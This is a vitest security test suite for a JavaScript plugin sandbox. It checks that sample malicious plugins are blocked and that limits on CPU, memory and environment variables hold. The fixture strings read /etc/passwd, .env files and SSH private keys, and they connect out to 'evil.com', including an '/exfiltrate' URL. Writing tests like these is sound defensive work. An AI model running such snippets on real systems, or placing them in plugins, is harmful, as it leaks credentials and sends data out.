/**
 * Plugin Sandbox Security Tests
 *
 * Tests to verify that the plugin sandbox prevents security vulnerabilities:
 * - Filesystem access (reading /etc/passwd, SSH keys, .env files)
 * - Network access restrictions
 * - Node.js built-in module access (fs, child_process, net, etc.)
 * - Memory and CPU limits
 * - Environment variable leakage
 */

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import type { PluginPermissions } from "./plugin-permissions.js";
import { PluginSandbox, executeSandboxedPlugin } from "./plugin-sandbox.js";

describe("PluginSandbox Security Tests", () => {
  let tempDir: string;

  beforeEach(() => {
    // Create temp directory for test files
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "plugin-sandbox-test-"));
  });

  afterEach(() => {
    // Clean up temp directory
    if (fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe("Filesystem Access Prevention", () => {
    it("should block reading /etc/passwd", async () => {
      const maliciousCode = `
        const fs = require('fs');
        const passwd = fs.readFileSync('/etc/passwd', 'utf-8');
        module.exports = { data: passwd };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "malicious-fs-read",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {}, // No permissions granted
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/require.*not.*allowed|Module.*not allowed/i);
    });

    it("should block reading .env files", async () => {
      const maliciousCode = `
        const fs = require('fs');
        const env = fs.readFileSync('.env', 'utf-8');
        module.exports = { secrets: env };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "malicious-env-read",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/require.*not.*allowed|Module.*not allowed/i);
    });

    it("should block reading SSH keys", async () => {
      const maliciousCode = `
        const fs = require('fs');
        const os = require('os');
        const sshKey = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf-8');
        module.exports = { key: sshKey };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "malicious-ssh-read",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/require.*not.*allowed|Module.*not allowed/i);
    });
  });

  describe("Node.js Built-in Module Blocking", () => {
    it("should block require('fs')", async () => {
      const maliciousCode = `
        const fs = require('fs');
        module.exports = { fs };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "block-fs",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/require.*not.*allowed|Module.*not allowed/i);
    });

    it("should block require('child_process')", async () => {
      const maliciousCode = `
        const { exec } = require('child_process');
        exec('whoami', (err, stdout) => {
          module.exports = { user: stdout };
        });
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "block-child-process",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/require.*not.*allowed|Module.*not allowed/i);
    });

    it("should block require('net')", async () => {
      const maliciousCode = `
        const net = require('net');
        const client = net.connect(1337, 'evil.com');
        module.exports = { client };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "block-net",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/require.*not.*allowed|Module.*not allowed/i);
    });

    it("should block require('http')", async () => {
      const maliciousCode = `
        const http = require('http');
        http.get('http://evil.com/exfiltrate', (res) => {
          module.exports = { res };
        });
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "block-http",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/require.*not.*allowed|Module.*not allowed/i);
    });

    it("should block require('os')", async () => {
      const maliciousCode = `
        const os = require('os');
        module.exports = {
          hostname: os.hostname(),
          homedir: os.homedir(),
          userInfo: os.userInfo(),
        };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "block-os",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/require.*not.*allowed|Module.*not allowed/i);
    });
  });

  describe("Process and Environment Variable Blocking", () => {
    it("should block access to process.env by default", async () => {
      const maliciousCode = `
        module.exports = {
          env: typeof process !== 'undefined' ? process.env : null,
        };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "block-env",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: { env: false },
      });

      expect(result.success).toBe(true);
      expect(result.exports).toBeDefined();
      const exports = result.exports as { env: unknown };
      expect(exports.env).toBeUndefined();
    });

    it("should only expose allowed env vars when env permission granted", async () => {
      // Set test env var
      process.env.ALLOWED_VAR = "allowed-value";
      process.env.SECRET_VAR = "secret-value";

      const maliciousCode = `
        module.exports = {
          allowed: typeof process !== 'undefined' ? process.env.ALLOWED_VAR : null,
          secret: typeof process !== 'undefined' ? process.env.SECRET_VAR : null,
        };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "filtered-env",
        pluginSource: "test.js",
        code: maliciousCode,
        permissions: {
          env: true,
          envVars: ["ALLOWED_VAR"],
        },
      });

      expect(result.success).toBe(true);
      const exports = result.exports as { allowed: string; secret: string };
      expect(exports.allowed).toBe("allowed-value");
      expect(exports.secret).toBeUndefined();

      // Cleanup
      delete process.env.ALLOWED_VAR;
      delete process.env.SECRET_VAR;
    });
  });

  describe("CPU and Memory Limits", () => {
    it("should enforce CPU timeout on infinite loop", async () => {
      const infiniteLoopCode = `
        while(true) {
          // Infinite loop
        }
        module.exports = { done: false };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "infinite-loop",
        pluginSource: "test.js",
        code: infiniteLoopCode,
        permissions: { cpu: 1000 }, // 1 second limit
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/timeout|CPU|exceeded/i);
    });

    it("should enforce CPU timeout on expensive computation", async () => {
      const expensiveCode = `
        let sum = 0;
        for (let i = 0; i < 1e9; i++) {
          sum += Math.sqrt(i);
        }
        module.exports = { sum };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "expensive-computation",
        pluginSource: "test.js",
        code: expensiveCode,
        permissions: { cpu: 500 }, // 500ms limit
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/timeout|CPU|exceeded/i);
    });

    it("should enforce memory limit", async () => {
      const memoryHogCode = `
        const bigArray = [];
        for (let i = 0; i < 1e8; i++) {
          bigArray.push(new Array(1000).fill(i));
        }
        module.exports = { size: bigArray.length };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "memory-hog",
        pluginSource: "test.js",
        code: memoryHogCode,
        permissions: { memory: 8 }, // 8MB limit
      });

      // Should either fail with memory error or timeout
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/timeout|memory|CPU|exceeded/i);
    });
  });

  describe("Eval and Dynamic Code Execution", () => {
    it("should block eval() usage", async () => {
      const evalCode = `
        const result = eval('1 + 1');
        module.exports = { result };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "use-eval",
        pluginSource: "test.js",
        code: evalCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/eval|undefined|not a function/i);
    });

    it("should block Function constructor", async () => {
      const functionConstructorCode = `
        const fn = new Function('return 1 + 1');
        module.exports = { result: fn() };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "use-function-constructor",
        pluginSource: "test.js",
        code: functionConstructorCode,
        permissions: {},
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/Function|undefined|not a constructor/i);
    });
  });

  describe("Safe Plugin Execution", () => {
    it("should allow safe math operations", async () => {
      const safeCode = `
        module.exports = {
          add: (a, b) => a + b,
          multiply: (a, b) => a * b,
        };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "safe-math",
        pluginSource: "test.js",
        code: safeCode,
        permissions: {},
      });

      expect(result.success).toBe(true);
      expect(result.exports).toBeDefined();
    });

    it("should allow console logging", async () => {
      const consoleCode = `
        console.log('Test log');
        console.warn('Test warning');
        console.error('Test error');
        module.exports = { logged: true };
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "console-test",
        pluginSource: "test.js",
        code: consoleCode,
        permissions: {},
      });

      expect(result.success).toBe(true);
      const exports = result.exports as { logged: boolean };
      expect(exports.logged).toBe(true);
    });

    it("should allow basic JavaScript operations", async () => {
      const basicCode = `
        const data = {
          name: 'test',
          items: [1, 2, 3],
          nested: { key: 'value' },
        };

        const processed = {
          ...data,
          sum: data.items.reduce((a, b) => a + b, 0),
          uppercase: data.name.toUpperCase(),
        };

        module.exports = processed;
      `;

      const result = await executeSandboxedPlugin({
        pluginId: "basic-js",
        pluginSource: "test.js",
        code: basicCode,
        permissions: {},
      });

      expect(result.success).toBe(true);
      const exports = result.exports as {
        name: string;
        sum: number;
        uppercase: string;
      };
      expect(exports.name).toBe("test");
      expect(exports.sum).toBe(6);
      expect(exports.uppercase).toBe("TEST");
    });
  });

  describe("Sandbox Isolation", () => {
    it("should not leak global state between sandboxes", async () => {
      const code1 = `
        global.sharedState = 'from-plugin-1';
        module.exports = { state: global.sharedState };
      `;

      const code2 = `
        module.exports = { state: typeof global.sharedState !== 'undefined' ? global.sharedState : null };
      `;

      const result1 = await executeSandboxedPlugin({
        pluginId: "plugin-1",
        pluginSource: "test1.js",
        code: code1,
        permissions: {},
      });

      const result2 = await executeSandboxedPlugin({
        pluginId: "plugin-2",
        pluginSource: "test2.js",
        code: code2,
        permissions: {},
      });

      expect(result1.success).toBe(true);
      expect(result2.success).toBe(true);

      const exports1 = result1.exports as { state: string };
      const exports2 = result2.exports as { state: string | null };

      expect(exports1.state).toBe("from-plugin-1");
      expect(exports2.state).toBeNull(); // Should not see plugin-1's state
    });
  });
});
